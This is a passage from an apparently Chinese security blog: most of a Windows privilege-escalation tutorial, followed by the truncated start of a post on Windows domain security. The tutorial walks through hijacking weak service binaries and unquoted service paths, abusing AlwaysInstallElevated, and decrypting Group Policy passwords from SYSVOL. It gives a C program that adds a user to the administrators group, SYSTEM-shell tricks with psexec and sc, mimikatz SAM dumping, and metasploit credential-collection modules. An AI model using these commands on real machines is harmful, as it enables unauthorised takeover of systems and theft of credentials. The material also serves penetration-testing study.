title="仅对内网提供的服务"></a>仅对内网提供的服务</h2><ul><li><p>有时候一些服务只是允许内网用户访问，例如一个mysql服务器为了安全不允许外部进行连接。此外一些拥有高权限的程序往往也是针对内网的网络设备。例如打印机接口等。这些服务服务往往是容易存在漏洞的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li><p>可能输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Proto  Local address      Remote address     State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------      --------------     -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -</span><br><span class="line">    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -</span><br><span class="line">    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -</span><br><span class="line">    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -</span><br><span class="line">    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -</span><br><span class="line">    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -</span><br><span class="line">    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -</span><br></pre></td></tr></table></figure></li><li><p>注意监听的端口，对比一下你从外网扫描到的结果，这里面有没有是你外网访问不到的？</p></li><li><p>如果是这样的，你可以通过端口转发来连接它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Port forward using plink</span><br><span class="line">plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080</span><br><span class="line"></span><br><span class="line"># Port forward using meterpreter</span><br><span class="line">portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;</span><br><span class="line">portfwd add -l 3306 -p 3306 -r 192.168.1.101</span><br></pre></td></tr></table></figure></li><li><p>来看一下netstat命令的输出</p><h3 id="本地地址-0-0-0-0"><a href="#本地地址-0-0-0-0" class="headerlink" title="本地地址 0.0.0.0"></a>本地地址 0.0.0.0</h3></li><li>本地地址0.0.0.0意味着这个服务监听所有的接口，这个意味着所有人都可以连接。<h3 id="本地地址-127-0-0-1"><a href="#本地地址-127-0-0-1" class="headerlink" title="本地地址 127.0.0.1"></a>本地地址 127.0.0.1</h3></li><li>本地地址127.0.0.1意味着只能接受本台pc的连接，不允许任何其它地方的连接。<h3 id="本地地址-192-168-1-9"><a href="#本地地址-192-168-1-9" class="headerlink" title="本地地址 192.168.1.9"></a>本地地址 192.168.1.9</h3></li><li>本地地址192.168.1.9意味着只是监听来自本地网络的连接，所以只有本地的网络可以连接它，外网是不能连接的。<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2></li><li><p>通过如下的命令查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li><p>这个输出可能会很多，这个时候可以通过使用findstr命令进行一下过滤，我往往是将其粘贴到txt文档中，然后通过linux命令进行查找。虽然不是很优雅，但是能解决问题，你也可以修改SYSTEM为其它的高权限用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM</span><br></pre></td></tr></table></figure></li></ul><h2 id="脆弱的服务权限"><a href="#脆弱的服务权限" class="headerlink" title="脆弱的服务权限"></a>脆弱的服务权限</h2><ul><li>服务是windows上没有图形化界面运行在后台的程序。如果你发现一个服务允许everyone写，那么你可以将你的二进制文件写到这个目录并让它去执行。</li><li>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/01/windows权限提升(二)/servicedllhijack.png" alt=""></p><ul><li>服务程序路径每个人均可修改<br><img src="/2017/10/01/windows权限提升(二)/binpath.png" alt=""></li><li><p>2019年12月9日更新，工具<a href="https://github.com/antonioCoco/RogueWinRM" target="_blank" rel="noopener">RogueWinRM</a><br><a href="https://www.youtube.com/watch?v=9s8jYwx9FSA&amp;list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&amp;index=4&amp;t=0s" target="_blank" rel="noopener">link</a></p><h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li><p>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</p></li><li>如下的命令用于查看运行文件在非system32目录下的服务，并且使用icacls查看对应的权限。前提是你能够使用wmic，且你在c:\windows\temp目录有些权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;tokens=2 delims=&apos;=&apos;&quot; %a in (&apos;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&apos;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</span><br><span class="line"></span><br><span class="line">for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/01/windows权限提升(二)/wmic.png" alt=""></p><ul><li><p>system32目录被排除了，因为他们大多是正确的，一般都是系统创建的。</p><h3 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt</span><br><span class="line"></span><br><span class="line">FOR /F %i in (Servicenames.txt) DO echo %i</span><br><span class="line">type Servicenames.txt</span><br><span class="line"></span><br><span class="line">FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt</span><br><span class="line"></span><br><span class="line">FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</span><br></pre></td></tr></table></figure></li><li><p>现在你就可以使用cacls命令来逐个查看每个文件权限了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls &quot;C:\path\to\file.exe&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="查看脆弱点"><a href="#查看脆弱点" class="headerlink" title="查看脆弱点"></a>查看脆弱点</h3><ul><li><p>我们需要关注的是用户安装的二进制文件，而不是系统自带的，而且我们想要找的是这样权限的 BUILTIN\Users:(F) ，就是内建用户拥有所有权限的，或者是user/usergroup有F或者C权限的。<br>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\path\to\file.exe </span><br><span class="line">BUILTIN\Users:F</span><br><span class="line">BUILTIN\Power Users:C </span><br><span class="line">BUILTIN\Administrators:F </span><br><span class="line">NT AUTHORITY\SYSTEM:F</span><br></pre></td></tr></table></figure></li><li><p>这就意味着你当前用户拥有写权限，这个时候你可以重命名这个exe程序，然后将你的恶意程序放在这个目录下。最后重启这个程序，你的恶意程序就会被执行。这个恶意程序可以使用msfvenom来实现反弹shell或者获取最高权限。</p></li><li><p>下面的poc用于创建一个管理员组的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">    i = system(&quot;net localgroup administrators theusername /add&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后我们可以使用mingw编译它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe</span><br></pre></td></tr></table></figure></li></ul><h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul><li>现在我们需要重启服务来让我们的“恶意”程序得以执行，我们可以使用wmic命令或者net命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service NAMEOFSERVICE call startservice</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop [service name] &amp;&amp; net start [service name].</span><br></pre></td></tr></table></figure><ul><li>这个时候你的二进制文件就会以system或者以管理员上下文进行执行。<h3 id="移植你的meterpreter-shell"><a href="#移植你的meterpreter-shell" class="headerlink" title="移植你的meterpreter shell"></a>移植你的meterpreter shell</h3></li><li>如果你的meterpreter 会话不稳定这个时候你可以迁移到一个稳定的服务上，例如移植到winlogon这个服务上，这个服务是以system权限运行的，且一般是一直运行的。我们可以使用如下的命令查看winlogon的PID<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief | find &quot;winlogon&quot;</span><br></pre></td></tr></table></figure></li></ul><p>这个是有可以使用 migrate pid 进行转移。<br><strong>这里有个很好的例子！！！</strong><a href="https://medium.com/@bondo.mike/ptp-lab-privilege-escalation-with-services-5d14a99a28d1" target="_blank" rel="noopener">PTP Lab — Privilege Escalation with Services</a></p><h2 id="没有加双引号的服务路径"><a href="#没有加双引号的服务路径" class="headerlink" title="没有加双引号的服务路径"></a>没有加双引号的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Using WMIC</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># Using sc</span><br><span class="line">sc query</span><br><span class="line">sc qc service name</span><br><span class="line"></span><br><span class="line"># Look for Binary_path_name and see if it is unquoted.</span><br></pre></td></tr></table></figure><ul><li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<br><img src="/2017/10/01/windows权限提升(二)/unquoted.png" alt=""><br><a href="https://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="noopener">更多</a><br><a href="https://www.youtube.com/watch?v=G9yn3qNq7Vw" target="_blank" rel="noopener">更多1</a><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3></li><li><p>如果可执行文件的路径是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Program Files\something\winamp.exe</span><br></pre></td></tr></table></figure></li><li><p>我们可以放如下的程序在这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\program.exe</span><br></pre></td></tr></table></figure></li></ul><p>当服务重启的时候将会执行program.exe,我们可以利用任何有空格的目录，不仅仅是program files目录。</p><ul><li>更多的攻击技巧可以看这里：<br><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="noopener">http://toshellandback.com/2015/11/24/ms-priv-esc/</a><br>metasploit 也有这个模块  exploit/windows/local/trusted_service_path<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2></li><li><p>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，默认是没有配置的(即无法利用的)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure></li><li><p>这个配置错误的不多，更多可以看向这里<a href="https://xz.aliyun.com/t/203" target="_blank" rel="noopener">https://xz.aliyun.com/t/203</a><br><img src="/2017/10/01/windows权限提升(二)/AlwaysInstallElevated.png" alt=""><br><img src="/2017/10/01/windows权限提升(二)/backdoor.png" alt=""></p><h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2></li><li>如果一个机器是加入域了的，当前用户可以查看系统信息卷，这里可能有敏感的文件。</li><li><p>首先我们需要装载这个卷，为了查找到域控机器的ip地址，我们先看一下环境变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Output environment-variables</span><br><span class="line">set</span><br><span class="line"></span><br><span class="line"># Look for the following:</span><br><span class="line">LOGONSERVER=\\NAMEOFSERVER</span><br><span class="line">USERDNSDOMAIN=WHATEVER.LOCAL</span><br><span class="line"></span><br><span class="line"># Look up ip-addres</span><br><span class="line">nslookup nameofserver.whatever.local</span><br><span class="line"></span><br><span class="line"># It will output something like this</span><br><span class="line">Address:  192.168.1.101</span><br><span class="line"></span><br><span class="line"># Now we mount it</span><br><span class="line">net use z: \\192.168.1.101\SYSVOL</span><br><span class="line"></span><br><span class="line"># And enter it</span><br><span class="line">z:</span><br><span class="line"></span><br><span class="line"># Now we search for the groups.xml file</span><br><span class="line">dir Groups.xml /s</span><br></pre></td></tr></table></figure></li><li><p>如果发现有password，我们可以使用kali中的工具进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt encryptedpassword</span><br></pre></td></tr></table></figure></li></ul><h2 id="从admin到system权限"><a href="#从admin到system权限" class="headerlink" title="从admin到system权限"></a>从admin到system权限</h2><ul><li>有些时候需要用到system权限，例如操作注册表HKEY_LOCAL_MACHINE\SAM\SAM，以下总结一下从admin权限到system权限的技巧。<h3 id="xp和xp之前"><a href="#xp和xp之前" class="headerlink" title="xp和xp之前"></a>xp和xp之前</h3></li><li>如果你是一个有GUI界面的管理员组用户，如果你直接打开cmd.exe的时候，你只是以普通用户运行的这个程序，而当你右键以管理员身份运行你需要知道管理员密码。你可能没有管理员密码，这个时候你可以去c:\windows\system32 目录去运行cmd.exe 程序。</li><li><p>我们想要成为system 用户，还需要做以下的工作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time</span><br><span class="line"># Now we set the time we want the system CMD to start. Probably one minuter after the time.</span><br><span class="line">at 01:23 /interactive cmd.exe</span><br></pre></td></tr></table></figure></li><li><p>然后system权限的cmd就出现了。</p><h3 id="vista之后或者更新的系统"><a href="#vista之后或者更新的系统" class="headerlink" title="vista之后或者更新的系统"></a>vista之后或者更新的系统</h3></li><li>你首先需要上传一个psexec.exe 然后运行如下的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -i -s cmd.exe</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/10/01/windows权限提升(二)/psexec-admintosystem.png" alt=""></p><h3 id="创建服务的方式"><a href="#创建服务的方式" class="headerlink" title="创建服务的方式"></a>创建服务的方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br></pre></td></tr></table></figure><p><img src="/2017/10/01/windows权限提升(二)/sc-admintosystem.png" alt=""></p><h3 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h3><ul><li>如果你有个metasploit的meterpreter的会话，直接运行getsystem就可以</li><li>xpn专门写了篇文章分析了getsystem中使用的技术<br><img src="/2017/10/01/windows权限提升(二)/xpn-admintosystem.jpg" alt=""><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">referer</a><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure></li></ul><p>使用 mimikatz的驱动进行提权<br><img src="/2017/10/01/windows权限提升(二)/mimikatzdriver.png" alt=""><br>使用mimikatz的继承父进程权限方法<br><img src="/2017/10/01/windows权限提升(二)/mimikatzprocess.png" alt=""></p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ul><li>这里有个问题，就是system权限是windows最高的权限，那么是不是就可以“为所欲为”？，那么你可以尝试删除一下c:\windows\system32目录下的某个文件(cmd.exe除外不排除有其它的程序)，发现竟然删除不了。<br><img src="/2017/10/01/windows权限提升(二)/TrustedInstaller.png" alt=""></li><li>Files in System32 are typically owned by “TrustedInstaller” and are locked down really tightly. If you really, absolutely feel you must do this, the easiest way is to boot from a Linux LiveCD or a Windows install disk.<br><a href="https://superuser.com/questions/744589/cant-delete-system-files-from-system32-drivers-need-permission" target="_blank" rel="noopener">stackoverflow</a><br><a href="https://helpdeskgeek.com/windows-7/windows-7-how-to-delete-files-protected-by-trustedinstaller/" target="_blank" rel="noopener">Windows 7/8/10 – How to Delete Files Protected by TrustedInstaller</a></li><li>这个TrustedInstaller是比较有趣的用户，可以理解为安装系统的人，一般的administrator组或者system组的用户都是修改不了所属TrustedInstaller的问题，所以想要修改这种文件，只能通过修改文件所有者才能达到自己想要的结果。<br><img src="/2017/10/01/windows权限提升(二)/trustinstaller.png" alt=""><br><a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">the-art-of-becoming-trustedinstaller</a><h2 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3></li><li>metasploit有一些有意思的后渗透模块，你需要有一个meterpreter shell 然后去运行这些后渗透模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/service_permissions</span><br><span class="line"></span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"></span><br><span class="line">run post/windows/gather/credential_collector </span><br><span class="line"></span><br><span class="line">run post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_shares</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_snmp</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users</span><br><span class="line"></span><br><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure></li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><ul><li>Empire内置了PowerUp部分工具，用于系统提权。<br>可参考<a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="noopener">一篇文章精通PowerShell Empire 2.3</a><br><img src="/2017/10/01/windows权限提升(二)/allcheck.png" alt=""><h2 id="脆弱的驱动"><a href="#脆弱的驱动" class="headerlink" title="脆弱的驱动"></a>脆弱的驱动</h2></li><li>一些驱动程序也可以帮助我们提权，对这块儿没怎么研究，待更。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># List all drivers</span><br><span class="line">driverquery</span><br></pre></td></tr></table></figure></li></ul><h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2><h3 id="hotpotato"><a href="#hotpotato" class="headerlink" title="hotpotato"></a>hotpotato</h3><ul><li>Hot Potatok利用了windows中已有的一些问题，在windows默认配置下进行本地权限提升。实际是利用了NTLM重放(更确切的说是HTPP-&gt;SMB重放)，和NBNS欺骗。<br><img src="/2017/10/01/windows权限提升(二)/hotpotato.png" alt=""><h3 id="ms16032"><a href="#ms16032" class="headerlink" title="ms16032"></a>ms16032</h3></li><li></li><li>适用Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!</li><li>漏洞详情 <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a><br><img src="/2017/10/01/windows权限提升(二)/ms16-032.png" alt=""><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3></li><li>内核提权应该是我们最后万不得已才使用的方法，因为它往往容易导致系统不稳定或造成其它方面的问题。</li><li><p>首先来看一下系统的补丁情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"># or</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"># metasploit enumerate missing patches</span><br><span class="line">post/windows/gather/enum_patches</span><br><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line"># posershell </span><br><span class="line">get-hotfix | Sort-Object HotfixID |format-table</span><br></pre></td></tr></table></figure></li><li><p>查找exploit<br><img src="/2017/10/01/windows权限提升(二)/windowskernelexploit.png" alt=""></p></li><li>这里推荐一个工具<a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">Watson.exe</a> </li><li>或者是通过metasploit的post/windows/gather/enum_patches 补丁枚举进而查找对应的提权漏洞进行提权。<h3 id="python-转换成二进制文件"><a href="#python-转换成二进制文件" class="headerlink" title="python 转换成二进制文件"></a>python 转换成二进制文件</h3></li><li>如果我们的exploit是用python写的，但是受害机又没有python环境，这个时候可以使用pyinstaller或者其它工具将其转换成二进制文件。<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener">PowerUp</a><br><a href="https://github.com/fdiskyou/incognito2" target="_blank" rel="noopener">token窃取和debug权限滥用利用工具incognito</a><br><img src="/2017/10/01/windows权限提升(二)/incognito.png" alt=""><h2 id="other-1"><a href="#other-1" class="headerlink" title="other"></a>other</h2></li><li><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">Privilege Escalation: Weaponizing CVE-2019-1405 and CVE-2019-1322</a></li><li><a href="https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege" target="_blank" rel="noopener">CVE-2019-1388： Windows UAC 提权</a> 感觉这个挺有意思的，利用了运行consent.exe程序的高权限,使用浏览器打开网页之后再通过浏览器运行cmd.exe。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html" target="_blank" rel="noopener">Privilege Escalation Windows</a><br><a href="https://www.youtube.com/watch?v=DlJyKgfkoKQ" target="_blank" rel="noopener">Windows Privilege Escalation Techniques (Local)</a><br><a href="https://www.slideshare.net/jakx_/level-up-practical-windows-privilege-escalation" target="_blank" rel="noopener">Level Up! - Practical Windows Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=G9yn3qNq7Vw" target="_blank" rel="noopener">Windows Privilege Escalation Unquoted Service part1/2/3</a><br><a href="https://www.youtube.com/watch?v=vRivLCELwEY" target="_blank" rel="noopener">RomHack 2018 - show me your Windows privileges and I will lead you to SYSTEM - Pierini</a><br>!!! <a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener">提权环境-以上</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windows域安全</title>
      <link href="/2017/09/28/windows%E5%9F%9F%E5%AE%89%E5%85%A8/"/>
      <url>/2017/09/28/windows%E5%9F%9F%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li>域安全笔记<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2></li><li>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</li><li>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</li><li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</li><li><p>Active Directory = LDAP服务器＋LDAP应用（Windows域控）<br>就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。</p><h2 id="内网信息搜集以及常见域命令"><a href="#内网信息搜集以及常见域命令" class="headerlink" title="内网信息搜集以及常见域命令"></a>内网信息搜集以及常见域命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 